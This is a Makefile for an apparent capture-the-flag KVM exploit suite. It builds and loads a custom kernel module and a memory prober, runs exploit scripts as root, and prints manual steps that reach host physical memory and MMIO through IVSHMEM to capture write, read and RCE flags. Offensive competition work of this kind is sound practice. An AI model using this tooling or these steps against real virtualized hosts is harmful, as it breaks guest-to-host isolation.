# Makefile for KVM CTF Exploit Suite - FINAL VERSION
# Updated for proper GPA/HPA handling

# Kernel module build
KDIR ?= /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

# Module name
MODULE_NAME := kvm_probe_drv
obj-m += $(MODULE_NAME).o

# Userspace tools
PROBER := kvm_prober

# Python exploits
ULTIMATE_EXPLOIT := ultimate_kvm_exploit.py

# Deprecated exploits (kept for reference)
OLD_EXPLOITS := comprehensive_kvm_exploit.py \
                ivshmem_kvm_exploit.py \
                hybrid_kvm_exploit.py \
                properly_fixed_exploit.py

CC := gcc
CFLAGS := -Wall -O2

.PHONY: all clean install module userspace help test ultimate

all: module userspace

# Build kernel module (FINAL version with GPA/HPA)
module:
	@echo "[*] Building FINAL kernel module (GPA/HPA support)..."
	$(MAKE) -C $(KDIR) M=$(PWD) modules
	@echo "[+] Module features: GPA (guest), HPA (host), MMIO (hardware)"

# Build userspace tools (FINAL version)
userspace: $(PROBER)

$(PROBER): kvm_prober.c
	@echo "[*] Building FINAL kvm_prober (readhpa/writehpa commands)..."
	$(CC) $(CFLAGS) -o $(PROBER) kvm_prober.c
	@echo "[+] Tool supports: GPA, HPA, MMIO operations"

# Install everything
install: all
	@echo "[*] Installing FINAL kernel module..."
	sudo insmod $(MODULE_NAME).ko || true
	@echo "[*] Installing FINAL userspace tools..."
	sudo cp $(PROBER) /usr/local/bin/
	sudo chmod +x /usr/local/bin/$(PROBER)
	@echo "[*] Preparing ULTIMATE exploit..."
	chmod +x $(ULTIMATE_EXPLOIT) 2>/dev/null || echo "Warning: $(ULTIMATE_EXPLOIT) not found"
	@echo "[*] Verifying device..."
	@ls -la /dev/kvm_probe* 2>/dev/null || echo "Warning: Device not found"
	@echo ""
	@echo "[+] Installation complete!"
	@echo ""
	@echo "CRITICAL: Guest Physical ≠ Host Physical!"
	@echo "  - Use readhpa/writehpa for host memory"
	@echo "  - Use readgpa/writegpa for guest memory"
	@echo "  - Use MMIO for hardware/IVSHMEM access"

# Uninstall
uninstall:
	@echo "[*] Removing kernel module..."
	sudo rmmod $(MODULE_NAME) 2>/dev/null || true
	@echo "[*] Removing userspace tools..."
	sudo rm -f /usr/local/bin/$(PROBER)
	@echo "[+] Uninstallation complete!"

# Clean build artifacts
clean:
	@echo "[*] Cleaning build artifacts..."
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	rm -f $(PROBER)
	rm -f *.o *.ko *.mod.c *.mod *.order *.symvers
	rm -f .*.cmd
	rm -rf .tmp_versions
	@echo "[+] Clean complete!"

# Run tests with new HPA commands
test: install
	@echo "[*] Running FINAL functionality tests..."
	@echo ""
	@echo "  [Test 1] Device Access:"
	@sudo $(PROBER) getkaslr || echo "    KASLR detection failed (may be expected)"
	@echo ""
	@echo "  [Test 2] GPA Operations (Guest Memory):"
	@sudo $(PROBER) writegpa 1000000 deadbeefcafebabe || echo "    GPA write failed"
	@sudo $(PROBER) readgpa 1000000 8 || echo "    GPA read failed"
	@echo ""
	@echo "  [Test 3] HPA Operations (Host Memory - likely fails):"
	@sudo $(PROBER) writehpa 64279a8 4443424241efbeadde 2>&1 | head -2 || true
	@echo "    Note: ioremap failure is EXPECTED - need IVSHMEM"
	@echo ""
	@echo "  [Test 4] MMIO Operations (Hardware Access):"
	@sudo $(PROBER) readmmio_buf fe800000 16 2>/dev/null || echo "    No MMIO at 0xfe800000"
	@echo ""
	@echo "[+] Tests complete!"

# Run ULTIMATE exploit (RECOMMENDED)
ultimate: install
	@echo "[*] Running ULTIMATE KVM Exploit..."
	@if [ -f "$(ULTIMATE_EXPLOIT)" ]; then \
		sudo python3 $(ULTIMATE_EXPLOIT); \
	else \
		echo "[!] $(ULTIMATE_EXPLOIT) not found!"; \
		echo "[!] Make sure you have the FINAL version"; \
		exit 1; \
	fi

# Legacy exploits (DEPRECATED - kept for compatibility)
exploit-old: install
	@echo "[!] WARNING: Running DEPRECATED exploits (incorrect GPA handling)"
	@echo "[!] Use 'make ultimate' instead for correct exploitation"
	@echo ""
	@if [ -f "hybrid_kvm_exploit.py" ]; then \
		echo "=== Hybrid (OLD) ==="; \
		sudo python3 hybrid_kvm_exploit.py || true; \
	fi
	@if [ -f "ivshmem_kvm_exploit.py" ]; then \
		echo "=== IVSHMEM (OLD) ==="; \
		sudo python3 ivshmem_kvm_exploit.py || true; \
	fi

# Show PCI/IVSHMEM information
pci-info:
	@echo "[*] PCI Device Information:"
	@echo ""
	@lspci | head -10
	@echo ""
	@echo "[*] IVSHMEM Devices (vendor 1af4 - Red Hat/QEMU):"
	@lspci -d 1af4: -v 2>/dev/null || echo "  No IVSHMEM devices found"
	@echo ""
	@echo "[*] All virtio devices:"
	@lspci | grep -i virtio || echo "  No virtio devices found"
	@echo ""
	@echo "[*] BAR information (first 3 devices with BARs):"
	@for dev in /sys/bus/pci/devices/*/resource; do \
		if grep -qv "0x0000000000000000" $$dev 2>/dev/null; then \
			echo "Device: $$(dirname $$dev | xargs basename)"; \
			head -3 $$dev 2>/dev/null | while read line; do \
				if echo $$line | grep -qv "0x0000000000000000"; then \
					echo "  $$line"; \
				fi; \
			done; \
			echo ""; \
		fi; \
	done | head -30

# Show memory map
meminfo:
	@echo "[*] I/O Memory Map:"
	@cat /proc/iomem | grep -E "virtio|PCI|System RAM" | head -20
	@echo ""
	@echo "[*] Physical Memory Info:"
	@cat /proc/meminfo | grep -E "MemTotal|MemFree|MemAvailable"

# Check module status
status:
	@echo "[*] Module Status:"
	@lsmod | grep kvm_probe || echo "  Module not loaded"
	@echo ""
	@echo "[*] Device Status:"
	@ls -la /dev/kvm_probe* 2>/dev/null || echo "  Device not found"
	@echo ""
	@echo "[*] Recent Kernel Messages:"
	@dmesg | grep kvm_probe | tail -10 || echo "  No kernel messages"

# Manual exploitation examples
manual:
	@echo "[*] Manual Exploitation Commands:"
	@echo ""
	@echo "# Step 1: Find IVSHMEM device"
	@echo "lspci -d 1af4:"
	@echo ""
	@echo "# Step 2: Check BARs"
	@echo "cat /sys/bus/pci/devices/0000:XX:XX.X/resource"
	@echo ""
	@echo "# Step 3: Try direct HPA access (likely fails)"
	@echo "sudo kvm_prober writehpa 64279a8 4443424241efbeadde"
	@echo ""
	@echo "# Step 4: Try MMIO via BAR (most likely to work)"
	@echo "sudo kvm_prober writemmio_buf <bar_base+offset> 4443424241efbeadde"
	@echo ""
	@echo "# Step 5: Read RCE flag"
	@echo "sudo kvm_prober readfile /root/rce_flag 0 256"
	@echo ""
	@echo "# Or just run the ultimate exploit:"
	@echo "make ultimate"

# Address space info
address-info:
	@echo "╔═══════════════════════════════════════════════════════╗"
	@echo "║         Address Space Understanding (CRITICAL)       ║"
	@echo "╚═══════════════════════════════════════════════════════╝"
	@echo ""
	@echo "Guest Address Space          Host Address Space"
	@echo "───────────────────          ──────────────────"
	@echo "GPA 0x64279a8                HPA 0x64279a8 ← FLAG HERE!"
	@echo "(guest's RAM)                (actual host RAM)"
	@echo ""
	@echo "These are DIFFERENT memory locations!"
	@echo ""
	@echo "To access HOST memory from guest:"
	@echo "  ✓ Use MMIO (kvm_prober writemmio_buf)"
	@echo "  ✓ Use HPA  (kvm_prober writehpa - may fail)"
	@echo "  ✗ DON'T use GPA (that's guest memory only!)"
	@echo ""
	@echo "IVSHMEM provides the bridge:"
	@echo "  Guest MMIO write → IVSHMEM BAR → Host Physical Memory"

# Help
help:
	@echo "╔═══════════════════════════════════════════════════════╗"
	@echo "║    KVM CTF Exploit Suite - FINAL Makefile            ║"
	@echo "╚═══════════════════════════════════════════════════════╝"
	@echo ""
	@echo "Build Targets:"
	@echo "  make all          - Build kernel module and userspace tools"
	@echo "  make module       - Build FINAL kernel module (GPA/HPA support)"
	@echo "  make userspace    - Build FINAL kvm_prober"
	@echo "  make install      - Build and install everything"
	@echo "  make clean        - Clean build artifacts"
	@echo ""
	@echo "Exploitation Targets:"
	@echo "  make ultimate     - Run ULTIMATE exploit (RECOMMENDED) ⭐"
	@echo "  make exploit-old  - Run old exploits (DEPRECATED)"
	@echo "  make manual       - Show manual exploitation commands"
	@echo ""
	@echo "Information Targets:"
	@echo "  make test         - Run functionality tests"
	@echo "  make pci-info     - Show PCI/IVSHMEM devices"
	@echo "  make meminfo      - Show memory map"
	@echo "  make status       - Show module/device status"
	@echo "  make address-info - Explain address spaces"
	@echo ""
	@echo "Quick Start:"
	@echo "  1. make install      # Build and load everything"
	@echo "  2. make pci-info     # Check for IVSHMEM"
	@echo "  3. make ultimate     # Run the ultimate exploit"
	@echo ""
	@echo "CTF Targets (HOST addresses):"
	@echo "  Write Flag:  HOST phys 0x64279a8 = 0xdeadbeef41424344"
	@echo "  Read Flag:   HOST phys 0x695ee10"
	@echo "  RCE Flag:    /root/rce_flag"
	@echo ""
	@echo "Files:"
	@echo "  ✓ kvm_probe_drv.c  - FINAL driver (GPA/HPA/MMIO)"
	@echo "  ✓ kvm_prober.c     - FINAL tool (readhpa/writehpa)"
	@echo "  ✓ ultimate_kvm_exploit.py - FINAL exploit (8 methods)"